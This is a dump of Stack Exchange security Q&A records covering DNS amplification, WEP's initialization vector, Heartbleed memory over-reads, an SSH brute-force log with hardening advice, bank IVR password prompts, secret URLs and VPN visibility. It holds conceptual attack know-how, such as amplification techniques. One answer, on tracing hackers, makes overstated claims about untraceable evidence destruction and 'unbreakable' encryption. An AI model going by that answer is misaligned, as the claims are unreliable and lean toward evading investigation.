  the response to the target.  </p>
</blockquote>

<hr>

<p><strong><a href=""https://deepthought.isc.org/article/AA-00897/0/What-is-a-DNS-Amplification-Attack.html"" rel=""noreferrer"">DNS Amplification Attack definition 2</a>:</strong></p>

<blockquote>
  <p>A DNS Amplification Attack is a Distributed Denial of Service (DDoS)
  tactic that belongs to the class of reflection attacks -- attacks in
  which an attacker delivers traffic to the victim of their attack by
  reflecting it off of a third party so that the origin of the attack is
  concealed from the victim.</p>
</blockquote>

<p>If you google ""DNS Reflection Attack"" what is resolved is a list of DNS amplification attacks.</p>

<p>US-CERT only notes of DNS Amplification Attacks.  </p>

<p>Both definitions denote that the amplification attack is a class or part of a reflection attack.</p>

<p>What is the difference between just a DNS reflection attack and a DNS amplification attack?</p>
","<p>Full disclosure, I work for a company that develops DDoS mitigation and web application firewall services</p>

<p>DNS amplification is a Distributed Denial of Service (DDoS) attack in which the attacker exploits vulnerabilities in domain name system (DNS) servers to turn initially small queries into much larger payloads, which are used to bring down the victim’s servers.</p>

<p>DNS amplification is a type of reflection attack which manipulates publically-accessible domain name systems, making them flood a target with large quantities of UDP packets. Using various amplification techniques, perpetrators can “inflate” the size of these UDP packets, making the attack so potent as to bring down even the most robust Internet infrastructure.</p>

<p>DNS amplification, like other amplification attacks, is a type of reflection attack. In this case, the reflection is achieved by eliciting a response from a DNS resolvers to a spoofed IP address.</p>

<p>During a DNS amplification attack, the perpetrator sends out a DNS query with a forged IP address (the victim’s) to an open DNS resolver, prompting it to reply back to that address with a DNS response. With numerous fake queries being sent out, and with several DNS resolvers replying back simultaneously, the victim’s network can easily be overwhelmed by the sheer number of DNS responses.</p>

<p>To amplify a DNS attack, each DNS request can be sent using the EDNS0 DNS protocol extension, which allows for large DNS messages, or using the cryptographic feature of the DNS security extension (DNSSEC) to increase message size. Spoofed queries of the type “ANY,” which returns all known information about a DNS zone in a single request, can also be used.</p>

<p>Through these and other methods, a DNS request message of some 60 bytes can be configured to elicit a response message of over 4000 bytes to the target server – resulting in a 70:1 amplification factor. This markedly increases the volume of traffic the targeted server receives, and accelerates the rate at which the server’s resources will be depleted.</p>

<p>Moreover, DNS amplification attacks generally relay DNS requests through one or more <a href=""https://www.incapsula.com/ddos/ddos-attacks/botnet-ddos.html"">botnets</a> – drastically increasing the volume of traffic directed at the targeted server or servers, and making it much harder to trace the attacker’s identity.</p>

<p>My company provides various solutions to protect yourself against DNS attacks. Please read more about how you can mitigate these sort of attacks: <a href=""https://www.incapsula.com/ddos/attack-glossary/dns-amplification.html"">https://www.incapsula.com/ddos/attack-glossary/dns-amplification.html</a></p>
","94270"
"How does WEP wireless security work?","16016","","<p>I want to know more about how <a href=""https://en.wikipedia.org/wiki/Wired_Equivalent_Privacy"" rel=""noreferrer"">WEP</a> (Wired Equivalent Privacy) protocol for wireless security. From <a href=""http://en.wikipedia.org/wiki/Wired_Equivalent_Privacy"" rel=""noreferrer"">this Wikipedia article</a> I have got a basic Idea. But what is the initialize vector? Is some kind of token sent for each request? Or is the connecting device authenticated only once in the beginning or some kind of token sent for each request (equivalent to cookies for authentication in Gmail, Yahoo, etc.)?</p>

<p>I have tried to set up WEP security for my Wi-Fi. As per instructions from my ISP, I did the following:</p>

<pre><code>Network Authentication - Open
WEP Encryption         - Enabled
Current Network Key    -1
Encryption Key         -64 bit
Network Key 1          -abcdefghij (10 characters)
Network Key 2          -
Network Key 3          -
Network Key 4          -
</code></pre>

<p>What are these network keys?</p>
","<p>The <a href=""http://en.wikipedia.org/wiki/Initialization_vector"">initialization vector</a> in WEP is a 24-bit random value that is used to seed the RC4 algorithm.</p>

<p>RC4 is a stream cipher. This means that for each bit of plaintext, it produces one bit of keystream and xors the two, to generate the ciphertext. The keystream is simply a stream of random numbers, generated from the RC4 algorithm.</p>

<p>In the most basic operation of a stream cipher, the algorithm is seeded with a key, such that the same key will always produce the same stream of random numbers. Since both the client and server know the key, they can produce the same keysteam. This allows the client to xor the plaintext with the keystream to produce the ciphertext, and the server to xor the ciphertext with the keystream to produce the plaintext again.</p>

<p><img src=""https://i.stack.imgur.com/zIHdV.png"" alt=""RC4 (WEP) stream cipher diagram""></p>

<p>The problem with this is that a key is only a few tens of bits long, but the plaintext may be gigabytes. After a large number of bits have been produced by RC4, the random numbers become predictable, and may even loop back round to the start. This is obviously undesirable, because a known plaintext attack would be able to compute the keystream (c1 xor c2 = k) and use it to decrypt new messages.</p>

<p>In order to solve this problem, an IV was introduced to complement the seed. The IV is a random 24-bit value that changed periodically, in an attempt to prevent re-use of the keystream. Unfortunately, 24 bits is quite small, and the IV often wasn't generated in an unpredictable way, allowing attackers to guess future IVs and use them to deduce the key.</p>

<p>Further attacks involved actively injecting packets into the network, tricking the access point into issuing lots of new IVs, which allowed attackers to crack WEP in minutes or seconds.</p>

<p>Further reading:</p>

<ul>
<li><a href=""https://en.wikipedia.org/wiki/Fluhrer,_Mantin_and_Shamir_attack"">Fluhrer, Mantin and Shamir attack</a></li>
<li><a href=""https://en.wikipedia.org/wiki/Wired_Equivalent_Privacy#Security_details"">WEP Flaws</a></li>
<li><a href=""http://www.airscanner.com/pubs/wep.pdf"">How WEP cracking works (PDF)</a></li>
</ul>
","17436"
"How is the Heartbleed exploit even possible?","15956","","<p>I have read about the Heartbleed OpenSSL vulnerability and understand the concept. However what I don't understand is the part where we pass 64k as the length and the server returns 64kb of random data because it does not check whether we really passed 64kb of echo message or 1 byte.</p>

<p>But how is it even possible for a process on a server to return 64kb of random data from the RAM? </p>

<p>Isn't the operating system supposed to prevent access to the real RAM and only allow access to virtual memory where one process cannot access the memory contents of other processes?</p>

<p>Does OpenSSL run in kernel mode and thus has access to all the RAM?</p>

<p>I would expect a segmentation fault if a process tried to access any memory that it didn't explicitly allocate. I can understand getting 64kb of random data from the process which is running the OpenSSL program itself but I don't see how it can even see the complete RAM of the server to be able to send it back to the client.</p>

<p><strong>UPDATE:</strong>
@paj28's comment, yes it was precisely the false information that led me to wonder about this. As you said, even the official heartbleed.com advisory phrases it in a misleading way (although I would say they did so because it's intended for a much wider audience than just us technical folks and they wanted to keep it simple)</p>

<p>For reference, here is how heartbleed.com states it(emphasis mine):</p>

<blockquote>
  <p>The Heartbleed bug allows anyone on the Internet to <strong>read the memory of the systems</strong> protected by the vulnerable versions of the OpenSSL software.</p>
</blockquote>

<p>For any technical person that would imply the complete RAM of the virtual/physical machine.</p>
","<p>@paj28's comment covers the main point. OpenSSL is a shared library, so it executes in the same user-mode address space as the process using it. It can't see other process' memory at all; anything that suggested otherwise was wrong.</p>

<p>However, the memory being used by OpenSSL - the stuff probably near the buffer that Heartbleed over-reads from - is full of sensitive data. Specifically, it's likely to contain both the ciphertext and the plaintext of any recent or forthcoming transmissions. If you attack a server, this means you'll see messages sent to the server by others, and server responses to those messages. That's a good way to steal session tokens and private information, and you'll probably catch somebody's login credentials too. Other data stored by OpenSSL includes symmetric encryption keys (used for bulk data encryption and integrity via TLS) and private keys (used to prove identity of the server). An attacker who steals those can eavesdrop on (and even modify) the compromised TLS communication in realtime, or successfully impersonate the server, respectively (assuming a man-in-the-middle position on the network).</p>

<p>Now, there is one weird thing about Heartbleed that makes it worse than you might expect. Normally, there'd be a pretty good chance that if you try and read 64k of data starting from an arbitrary heap address within a process, you'd run into an unallocated memory address (virtual memory not backed by anything and therefore unusable) pretty quickly. These holes in a process address space are pretty common, because when a process frees memory that it no longer needs, the OS reclaims that memory so other processes can use it. Unless your program is leaking memory like a sieve, there usually isn't that much data in memory other than what is currently being used. Attempting to read unallocated memory (for example, attempting to access memory that has been freed) causes a read access violation (on Windows) / segmentation fault (on *nix), which will make a program crash (and it crashes before it can do anything like send data back). That's still exploitable (as a denial-of-service attack), but it's not nearly as bad as letting the attacker get all that data.</p>

<p>With Heartbleed, the process was almost never crashing. It turns out that OpenSSL, apparently deciding that the platform memory management libraries were too slow (or something; I'm not going to try to justify this decision), pre-allocates a large amount of memory and then uses its own memory management functions within that. This means a few things:</p>

<ul>
<li>When OpenSSL ""frees"" memory, it doesn't actually get freed as far as the OS is concerned, so that memory remains usable by the process. OpenSSL's internal memory manager might think the memory is not allocated, but as far as the OS is concerned, the OpenSSL-using process still owns that memory.</li>
<li>When OpenSSL ""frees"" memory, unless it explicitly wipes the data out before calling its <code>free</code> function, that memory retains whatever values it had before being ""freed"". This means a lot of data that isn't actually still in use can be read.</li>
<li>The memory heap used by OpenSSL is contiguous; there's no gaps within it as far as the OS is concerned. It's therefore very unlikely that the buffer over-read will run into a non-allocated page, so it's not likely to crash.</li>
<li>OpenSSL's memory use has very high locality - that is, it's concentrated within a relatively small range of addresses (the pre-allocated block) - rather than being spread across the address space at the whim of the OS memory allocator. As such, reading 64KB of memory (which isn't very much, even next to a 32-bit process' typical 2GB range, much less the enormous range of a 64-bit process) is likely to get a lot of data that is currently (or was recently) in use, even though that data resides in the result of a bunch of supposedly-separate allocations. </li>
</ul>
","139372"
"Am I experiencing a brute force attack?","15942","","<p>When checking the auth log of a server with the command:</p>

<pre><code>grep sshd.\*Failed /var/log/auth.log | less
</code></pre>

<p>I see thousands of lines like this:</p>

<pre><code>    Jan 12 11:27:10 ubuntu-leno1 sshd[8423]: Failed password for invalid user admins from 172.25.1.1 port 44216 ssh2
    Jan 12 11:27:13 ubuntu-leno1 sshd[8425]: Failed password for invalid user phoenix from 172.25.1.1 port 20532 ssh2
    Jan 12 11:27:17 ubuntu-leno1 sshd[8428]: Failed password for invalid user piglet from 172.25.1.1 port 24492 ssh2
    Jan 12 11:27:22 ubuntu-leno1 sshd[8430]: Failed password for invalid user rainbow from 172.25.1.1 port 46591 ssh2
    Jan 12 11:27:25 ubuntu-leno1 sshd[8432]: Failed password for invalid user runner from 172.25.1.1 port 57129 ssh2
    Jan 12 11:27:34 ubuntu-leno1 sshd[8434]: Failed password for invalid user sam from 172.25.1.1 port 11960 ssh2
    Jan 12 11:27:37 ubuntu-leno1 sshd[8437]: Failed password for invalid user abc123 from 172.25.1.1 port 5921 ssh2
    Jan 12 11:27:40 ubuntu-leno1 sshd[8439]: Failed password for invalid user passwd from 172.25.1.1 port 21208 ssh2
    Jan 12 11:27:43 ubuntu-leno1 sshd[8441]: Failed password for invalid user newpass from 172.25.1.1 port 65416 ssh2
    Jan 12 11:27:46 ubuntu-leno1 sshd[8445]: Failed password for invalid user newpass from 172.25.1.1 port 26332 ssh2
    Jan 12 11:27:49 ubuntu-leno1 sshd[8447]: Failed password for invalid user notused from 172.25.1.1 port 51126 ssh2
    Jan 12 11:27:52 ubuntu-leno1 sshd[8449]: Failed password for invalid user Hockey from 172.25.1.1 port 14949 ssh2
    Jan 12 11:27:56 ubuntu-leno1 sshd[8451]: Failed password for invalid user internet from 172.25.1.1 port 35105 ssh2
    Jan 12 11:27:59 ubuntu-leno1 sshd[8453]: Failed password for invalid user asshole from 172.25.1.1 port 7916 ssh2
    Jan 12 11:28:02 ubuntu-leno1 sshd[8456]: Failed password for invalid user Maddock from 172.25.1.1 port 26431 ssh2
    Jan 12 11:28:05 ubuntu-leno1 sshd[8458]: Failed password for invalid user Maddock from 172.25.1.1 port 53406 ssh2
    Jan 12 11:28:09 ubuntu-leno1 sshd[8460]: Failed password for invalid user computer from 172.25.1.1 port 23350 ssh2
    Jan 12 11:28:15 ubuntu-leno1 sshd[8462]: Failed password for invalid user Mickey from 172.25.1.1 port 37232 ssh2
    Jan 12 11:28:19 ubuntu-leno1 sshd[8465]: Failed password for invalid user qwerty from 172.25.1.1 port 16474 ssh2
    Jan 12 11:28:22 ubuntu-leno1 sshd[8467]: Failed password for invalid user fiction from 172.25.1.1 port 29600 ssh2
    Jan 12 11:28:26 ubuntu-leno1 sshd[8469]: Failed password for invalid user orange from 172.25.1.1 port 44845 ssh2
    Jan 12 11:28:30 ubuntu-leno1 sshd[8471]: Failed password for invalid user tigger from 172.25.1.1 port 12038 ssh2
    Jan 12 11:28:33 ubuntu-leno1 sshd[8474]: Failed password for invalid user wheeling from 172.25.1.1 port 49099 ssh2
    Jan 12 11:28:36 ubuntu-leno1 sshd[8476]: Failed password for invalid user mustang from 172.25.1.1 port 29364 ssh2
    Jan 12 11:28:39 ubuntu-leno1 sshd[8478]: Failed password for invalid user admin from 172.25.1.1 port 23734 ssh2
    Jan 12 11:28:42 ubuntu-leno1 sshd[8480]: Failed password for invalid user jennifer from 172.25.1.1 port 15409 ssh2
    Jan 12 11:28:46 ubuntu-leno1 sshd[8483]: Failed password for invalid user admin from 172.25.1.1 port 40680 ssh2
    Jan 12 11:28:48 ubuntu-leno1 sshd[8485]: Failed password for invalid user money from 172.25.1.1 port 27060 ssh2
    Jan 12 11:28:52 ubuntu-leno1 sshd[8487]: Failed password for invalid user Justin from 172.25.1.1 port 17696 ssh2
    Jan 12 11:28:55 ubuntu-leno1 sshd[8489]: Failed password for invalid user admin from 172.25.1.1 port 50546 ssh2
    Jan 12 11:28:58 ubuntu-leno1 sshd[8491]: Failed password for root from 172.25.1.1 port 43559 ssh2
    Jan 12 11:29:01 ubuntu-leno1 sshd[8494]: Failed password for invalid user admin from 172.25.1.1 port 11206 ssh2
    Jan 12 11:29:04 ubuntu-leno1 sshd[8496]: Failed password for invalid user chris from 172.25.1.1 port 63459 ssh2
    Jan 12 11:29:08 ubuntu-leno1 sshd[8498]: Failed password for invalid user david from 172.25.1.1 port 52512 ssh2
    Jan 12 11:29:11 ubuntu-leno1 sshd[8500]: Failed password for invalid user foobar from 172.25.1.1 port 35772 ssh2
    Jan 12 11:29:14 ubuntu-leno1 sshd[8502]: Failed password for invalid user buster from 172.25.1.1 port 18745 ssh2
    Jan 12 11:29:17 ubuntu-leno1 sshd[8505]: Failed password for invalid user harley from 172.25.1.1 port 38893 ssh2
    Jan 12 11:29:20 ubuntu-leno1 sshd[8507]: Failed password for invalid user jordan from 172.25.1.1 port 64367 ssh2
    Jan 12 11:29:24 ubuntu-leno1 sshd[8509]: Failed password for invalid user stupid from 172.25.1.1 port 27740 ssh2
    Jan 12 11:29:27 ubuntu-leno1 sshd[8511]: Failed password for invalid user apple from 172.25.1.1 port 22873 ssh2
    Jan 12 11:29:30 ubuntu-leno1 sshd[8514]: Failed password for invalid user fred from 172.25.1.1 port 54420 ssh2
    Jan 12 11:29:33 ubuntu-leno1 sshd[8516]: Failed password for invalid user admin from 172.25.1.1 port 58507 ssh2
    Jan 12 11:29:42 ubuntu-leno1 sshd[8518]: Failed password for invalid user summer from 172.25.1.1 port 48271 ssh2
    Jan 12 11:29:45 ubuntu-leno1 sshd[8520]: Failed password for invalid user sunshine from 172.25.1.1 port 5645 ssh2
    Jan 12 11:29:53 ubuntu-leno1 sshd[8523]: Failed password for invalid user andrew from 172.25.1.1 port 44522 ssh2
</code></pre>

<p>It seems that I'm experiencing an ssh brute force attack.
Is this a common occurrence, or am I being specifically targeted? 
What should I do now? Should I consider the attack successful and take measures?</p>

<p>-----Edit-------</p>

<p>The fact that the attack comes from an internal IP address is explained by this server having a ssh redirection from outside. 
It happened really quickly after opening the port, are every public IP scanned in the wild in search of an existing server behind ?</p>
","<p>Quick note added about <code>fail2ban</code>, as a lot of people have been mentioning it: The front-end is a corporate firewall, the back-end only sees the redirection/proxy that comes from the firewall. So no, 172.25.1.1 <em>is not an internal machine compromised</em>. Fail2ban in the back-end would only block all possibility to use SSH for stretches at a time as it only sees failed attempts from 172.25.1.1. So please, read on for my answer.</p>

<p>There are no doubts, as other posts mention, it is painfully obvious you are under a brute force attack. However, that does not mean at all you are compromised in any way from the logs you have shown us. </p>

<p>Alas, these days ssh brute force attacks are all too common. Most of the time they are really automated, and you are not necessarily being targeted. As an anecdotal warning tale, some years ago the 1st day I setup new servers in an ISP provider, the ssh one open to the Internet got 200k+ ssh scanning probes on a single night. </p>

<p>As for the ""internal IP address"",  either you are using SNAT or a 22/TCP proxy redirect at best, and the source Internet IPs do not show (which is not the best practice), or at worst your router/cable modem is compromised. </p>

<p>If you do really are having a SNAT/proxy SSH configuration, I do recommend you to think it over. You want logs of the real IP addresses, and not of your network.</p>

<p>As for measures, I do recommend some:</p>

<p>1) Do not allow passwords in SSH; only logins using RSA certificates;<br>
2) Do not open ssh for the outside; restrict it to your internal network;<br>
3) For accessing from the outside, access via a VPN; do not expose SSH to the Internet at large;<br>
4) rate-limiting SYNs from the outside.</p>

<p>If you absolutely insist in still having the SSH Internet open to the outside, be aware that changing the default SSH port gives only a fake sense of security, and blocking temporarily IP addresses only slows the attack down as often we are talking about coordinated farms of zombie machines. </p>

<p>You may want to have a look at <code>fail2ban</code> if you do change your configuration to receive directly public IP addresses connecting to you; however take in account that if indeed any external IP arrives with the IP address of your gateway, you are effectively locking out all external SSH access using it. </p>

<p>There are also other caveats; please do note that nowadays zombies/malware take into account <code>fail2ban</code>, and will return after the default timeout period or take turns with different IP addresses (I have seen it happen); and even that if use mandatory RSA certificate authentication, the password attacks will still be logged, and will burn I/O, disk space and CPU cycles.</p>

<p>As for the VPN, you do not need dedicated hardware; it is trivial to configure a VPN in a Linux or FreeBSD server. </p>

<p>If you do not feel comfortable setting one up from scratch, I do recommend a VM with pfSense. <a href=""https://www.pfsense.org"" rel=""nofollow"">https://www.pfsense.org</a> for FreeBSD; strongSwan for setting up a VPN in a Linux server. <a href=""https://wiki.strongswan.org/projects/strongswan/wiki/IOS_(Apple)"" rel=""nofollow"">https://wiki.strongswan.org/projects/strongswan/wiki/IOS_(Apple)</a></p>

<p>If your front-end server is Linux, another alternative is port knocking, however due to it´s inherent working, I only recommend it for domestic settings. As correctly pointed out by @GroundZero, ""port knocking is security by obscurity and an attacker can actively monitor your network traffic to discover the knocking sequence "".</p>

<p>""How To Use Port Knocking to Hide your SSH Daemon from Attackers on Ubuntu""</p>

<p><a href=""https://www.digitalocean.com/community/tutorials/how-to-use-port-knocking-to-hide-your-ssh-daemon-from-attackers-on-ubuntu"" rel=""nofollow"">https://www.digitalocean.com/community/tutorials/how-to-use-port-knocking-to-hide-your-ssh-daemon-from-attackers-on-ubuntu</a></p>

<p>As an additional measure, you can also rate-limit with firewall/iptables rules SYNs in port 22.  In this way, you wont rate limit your legitimate connections, and either iptables in linux, or most commercial firewalls allow that configuration. I have seen nasty tricks as bots attacking some daemons as fast as possible before security rules kick-in. However I do believe actually ssh has built-in defenses against that.</p>

<p>To answer you about the rampant scanning, yes indeed. You have a lot of bad actors, zombie networks and malware constantly scanning the IP address space to find servers with compromised versions of sshd, vulnerable/old sshd versions, servers with default/bad passwords/known backdoors, and simply servers with openssh to gain a foothold in a non-privileged user either via brute force or dual pronged attacks via phishing. </p>

<p>After three successful attacks via phishing (in separate events)  in my bastion host in my current work, I decided to do a dual ssh configuration in that all users are asked for a RSA certificate in <code>sshd_config</code>, and only the internal network allows password authentication, adding to the end of the configuration file as such:</p>

<pre><code># sshd configuration allowing only RSA certificates
Match Address 10.0.0.0/8,172.16.0.0/12,192.168.0.0/24
PasswordAuthentication yes
</code></pre>

<p>As another anecdotal scary tale, before I changed to mandatory RSA certificates, one of the phishing compromises was done in the exact week there were two kernel updates for vulnerabilities that allowed privilege escalation to root, and had I not updated on the spot, I would had been root compromised. (and if my memory does not fail me, it was around the 4th of July...hackers love to save that nasty attacks for holiday times)</p>

<p>As for graphs of actual live attacks real-time, have a look at the graphical interface of the Norse project. It is very educational.</p>

<p><a href=""http://map.norsecorp.com"" rel=""nofollow"">http://map.norsecorp.com</a></p>

<p>For DDOS attacks too:</p>

<p><a href=""http://www.digitalattackmap.com/"" rel=""nofollow"">http://www.digitalattackmap.com/</a></p>

<p>For a free view of Checkpoint's central security monitoring network, where the agents are their customers:</p>

<p><a href=""https://www.checkpoint.com/ThreatPortal/livemap.html"" rel=""nofollow"">https://www.checkpoint.com/ThreatPortal/livemap.html</a></p>

<p>To finish the answer: No, you probably are not compromised in any way. Yes, you have to take measures to increase your security level. I would advise a VPN tunnel/client from the outside to your corporate VPN server. (it is what I am doing actually)</p>

<p>I have also a last and important advice. To make sure a regular account was compromised, check your <code>/var/log/auth.log</code> authentication logs for a successful authentication. There are ways of logging into openssh with <em>any</em> account without it being registered in <code>/var/log/wtmp</code> and consequently   not appearing in the <code>last</code> command.</p>

<p>Evidently that goes without saying, that if a regular account is compromised in an old machine without updates, all bets are off, and in the unfortunate case of privilege escalation to root, the logs can be compromised.</p>
","110845"
"My bank support just asked me for my online banking credentials","15938","","<p>As title says, I was asked for my online banking password while on the process of getting in touch with a real person. This is something I'd never do and knowing that the call was being recorded (for further improvement of the bot I was <em>talking</em> to) makes it even worse.</p>

<p>For sure, after that, I hung up and I'm pretty sure it is a violation of privacy as you are asked for private details and also it is not encrypted whatsoever.</p>

<ul>
<li>Have anyone been asked for this before?</li>
<li>Is this a normal practice?   </li>
<li>After saying my ID number, the bot refered to me as ""Mr. <em>my_last_name</em>"" so I guess it is a legit phone number but, could they been hacked and the support number hijacked?</li>
<li>Should I take any actions?</li>
</ul>
","<p>Assuming that you called them on a published number, I'd say that this sounds like it was an interactive Voice Response (IVR) system, which is pretty common in the banking world.  </p>

<p>The concept is that the system takes your authentication information before passing you on to a contact centre agent.  The benefit of this from a security perspective is that then the agent in the call centre doesn't have to ask you to authenticate yourself, before discussing your account.</p>

<p>If correctly implemented this should be no more insecure than typing your password into a website.  There is an automated system processing the voice data and it should store/log this appropriately.</p>

<p>Of course as you point out there is the risk of phone tapping, but then if you assume that your phone line is tapped, any form of phone banking is insecure as they've got to authenticate you somehow to be able to discuss your account with you.</p>

<p><strong>EDIT:</strong> To add some more details, rather than leave them scattered around comments that could get cleared.</p>

<p>Basically banks have to authenticate you somehow, no matter which channel (e.g. web, phone, branch) you use to contact them, and there are trade-offs to be considered.</p>

<p>On the one hand having dedicated credentials per channel is useful in that it reduce the risk of compromise, and avoids muddying the message of ""don't tell people your web password"" but it leaves users with more credentials to manage and in all likelihood a lot of password resets if users only use a specific channel rarely (with all the vulnerabilities that frequent resets attract)</p>

<p>So the option that it appears, from the information provided, that's used here is to combine the credentials for the web and phone channels, and to use an automated IVR system on the phone channel to avoid credentials being given to contact centre agents.  The upside here is single set of creds, so user's won't forget them, and the downside is the scenario we see where bank messaging ""don't give people your password"" leads to problems in using this system.</p>

<p>In terms of the IVR system security, this is essentially like any other system that processes data. It needs to be secured appropriately so that user credentials are not exposed, no different than the web channel.</p>

<p>Obviously a system like hardware (not SMS) 2FA could work well in this scenario as numeric codes are easily passed to IVR systems, but that has it's own tradeoffs in terms of cost and user experience.</p>
","167131"
"A secret in a URL","15938","","<p>Lately I've seen plenty of APIs designed like this:</p>

<pre><code>curl ""https://api.somewebsite.com/v1/something&amp;key=YOUR-API-KEY""
</code></pre>

<p>Isn't it elementary that passing an API key in a query string as a part of the URL is not secure at least in HTTP.</p>
","<p>Summary: <strong>Capability URLs are a lot more secure than people give them credit for.</strong></p>

<hr>

<p>These type of URLs are commonly known as capability / secret URLs.</p>

<p>It's meaningless to talk about security without specifying a threat model. Here are a couple that come to mind:</p>

<ul>
<li>1: A passive attacker on the network (eavesdroping)</li>
<li>2: An active attacker on the network (can change packets at will, mitm, etc)</li>
<li>3: A <a href=""https://en.wikipedia.org/wiki/Shoulder_surfing_%28computer_security%29"" rel=""noreferrer"">shoulder-surfer</a></li>
<li>4: An attacker with physical access to your computer / elevated privileges</li>
<li>5: another user of your computer (regular privileges / remote access)</li>
<li>6: the user itself (as in protecting a API key)</li>
</ul>

<hr>

<p><strong>Regarding network attacks (1 and 2), secret URLs are perfectly secure</strong>, provided you're using HTTPS (it's 2016, you shouldn't be using HTTP anymore!). </p>

<p>While the hostname of a server is sent in plaintext over the network, the actual URL is encrypted before being sent to the server - as it's part of the GET request, which only occurs <em>after</em> the TLS handshake.</p>

<hr>

<p><strong>Regarding shoulder-surfing (3), a secret URL with enough entropy is reasonably secure against a casual attack</strong>· As an example, I'll give a google docs URL:</p>

<blockquote>
  <p><a href=""https://docs.google.com/document/d/5BPuCpxGkVOxkjTG0QrS-JoaImEE-kNAi0Ma9DP1gy"" rel=""noreferrer"">https://docs.google.com/document/d/5BPuCpxGkVOxkjTG0QrS-JoaImEE-kNAi0Ma9DP1gy</a></p>
</blockquote>

<p>Good luck remembering that while passing by a co-worker's screen!</p>

<p>Obviously, <strong>if your attacker has a camera and can take a picture without being noticed, it's an entirely different matter</strong> - you shouldn't use a secret URL in that situation.</p>

<hr>

<p><strong>Regarding an attacker with elevated privileges on your computer (4), a secret URL is not less secure than a long password</strong> or even a client-side TLS certificate - as all of those are actually completely insecure, and there's not much you can do about that.</p>

<p><strong>An attacker with regular privileges (5), on the other hand, should not be able to learn the secret URL as well, as long as you follow good security practices for your OS</strong>. Your files (particularly browser history) should not be readable by other users.</p>

<hr>

<p><strong>For protecting API keys (6, which was the point of this question), a secret URL is also no-less-secure than another mechanism (such as an AJAX POST)</strong>. Anyone that has an use for an API key will know how to use the browser debug mode to get the key.</p>

<p>It's not reasonable to send someone a secret and expect them not to look at it!</p>

<hr>

<p>Some people have asked about the risks on the server side.</p>

<p>It's not reasonable to treat server-side risks by threat modelling; from a user perspective, you really have to treat the server as a <a href=""https://en.wikipedia.org/wiki/Trusted_third_party"" rel=""noreferrer"">trusted third party</a>, as if your adversary has internal network access on the server side, there's really nothing you can do (very much like a privileged attacker on the client's computer, i.e. threat model 4 above). </p>

<p>Instead of modelling attacks, I'll outline <strong>common risks of unintentional secret exposure</strong>.</p>

<p>The most common concern with using secret URLs on the server side is that both <strong>HTTP server and reverse proxies keep logs, and the URL is very often included</strong>. </p>

<p>Another possibility is that <strong>the secret URLs could be generated in a predictable way</strong> - either because of a flawed implementation, a insecure <a href=""https://en.wikipedia.org/wiki/Pseudorandom_number_generator"" rel=""noreferrer"">PRNG</a>, or giving insufficient entropy when <a href=""https://en.wikipedia.org/wiki/Random_seed"" rel=""noreferrer"">seeding it</a>. </p>

<p>There are also many caveats that have to be taken into consideration when designing a site that uses secret URLs. <a href=""https://w3ctag.github.io/capability-urls/"" rel=""noreferrer"">This page by W3C TAG</a> covers many of them.</p>

<p>In practice, for sites with dynamic content, it's quite hard to get everything done securely - both <a href=""http://blogs.intralinks.com/collaborista/2014/07/google-drive-found-leaking-private-data-warning-shared-links/"" rel=""noreferrer"">Google</a> and <a href=""http://blogs.intralinks.com/collaborista/2014/05/sensitive-information-risk-file-sync-share-security-issue/"" rel=""noreferrer"">Dropbox</a> botched it in the past, as mentioned on <a href=""https://security.stackexchange.com/a/91842/20022"">this answer</a></p>

<hr>

<p>Finally, <strong>secret URLs have a couple of advantages over other authentication methods</strong>:</p>

<ul>
<li>They are extremely easy to use (just click the link, as opposed to entering your email and password)</li>
<li>They don't require the server / service to securely store sensitive user credentials</li>
<li>They are easily shareable without risks, unlike sharing you password (which you reuse for 50 other sites).</li>
</ul>
","118994"
"How to trace malicious hackers?","15931","","<p>What are some of the ways law enforcement agencies can trace a hacking attempt back to the hacker?</p>

<p>IP and MAC addresses can be spoofed easily, hackers can easily hide their tracks using compromised host around the globe to launch attacks from.</p>

<p>In such a situation, is it at all possible for law enforcement agencies to track and arrest these hackers?</p>

<p>How about some of the more localized attacks like cracking WEP/WPA passwords to gain access to the wireless network, or web application attacks like XSS or SQL injections? </p>

<p><em>Help with tagging is appreciated, i don't know what to tag this question as.</em></p>
","<p>Terry Chia, we meet again xD. Simple put, although <strong>technologies to track hackers are present, there are a number of constraints on governments that prevent them from doing so</strong>. That said, a private individual working as a blackhat will probably have better chances to track a particular hacker.</p>

<p>To begin with, the main reason law enforcement agencies arrest hackers in the first place is their connection to their (generally some crappy free) VPN breaks down without their realization. The reason IP Spoofing is so devastating is if a US individual spoofs a Russian and then Chinese IP, it is almost certain that the two governments would never help US law enforcement. So you ask how it can be done?</p>

<p>To track such a hacker a number of precautions would have to be applied on the server, JavaScript and PHP like languages can provide useful information such as the clients browser, operating system, etc which is generally not spoofed. Additionally, web application attacks will not work because I doubt the hacker will stay on the same IP for long.</p>

<p>For example, Google has been known to be able to track users even under spoofed IPs and disabled geo location instantly. They do this, by capturing all wifi points in range every time you connect to them, by matching this to their existing database of wifi points they could easily locate you. The technique essential works by invading user privacy. If the ""law enforcement"" could access such a database, they could use it against you. Additionally if they can somehow sniff such traffic they could obtain the same info.</p>

<p>Here's a video demonstration that: <a href=""http://www.youtube.com/watch?v=McF50tjuFEs"" rel=""nofollow"">http://www.youtube.com/watch?v=McF50tjuFEs</a></p>

<p>Ultimately, it's <strong>not viable for law enforcement to accurately track or arrest any individual</strong>, because laws in most country believe that a person is not guilty unless convicted. What I mean is that, even if they get your ""true IP"" and come to your house, hackers have been known to have security measures to erase disks several times over beyond capabilities of cyber forensics or use Deep Freeze/TrueCrypt to hide and lock that data with multiple unbreakable layers of encryption.
If you do it right, there's no ""evidence"" on your PC. In fact, people can got away in many cases because they claimed their computer was used as a zombie or their wifi was hacked. In many cases it is true.</p>
","16413"
"Can wifi network administrators see through proxy servers?","15921","","<p>I've looked at a lot of VPNs, and ""what's my ip address"" sites confirm that outsiders can't tell where I really am when I'm using them, but I haven't been able to get my own WiFi yet, so I don't know what privileges they have. Can they tell that a proxy server is being used by their network, even if the person using it is obscured?</p>
","<p>Yes, and you may not be as obscured as you think. They can't tell what you're <em>saying</em> to a VPN server (because it's encrypted), including what sites you're accessing via the VPN, but they can tell that you are <em>connecting</em> to that VPN server. In networks where you have to register your device to your name somehow (e.g. many university networks), they can also tell that it's <em>you</em> (or someone impersonating you) who is connecting to the VPN.</p>

<p>For an example: I have laptop A, an account on VPN server B. I want to say ""hello"" to site C.</p>

<ul>
<li>If I talk directly to site C, a network administrator can see ""A said 'hello' to C"".</li>
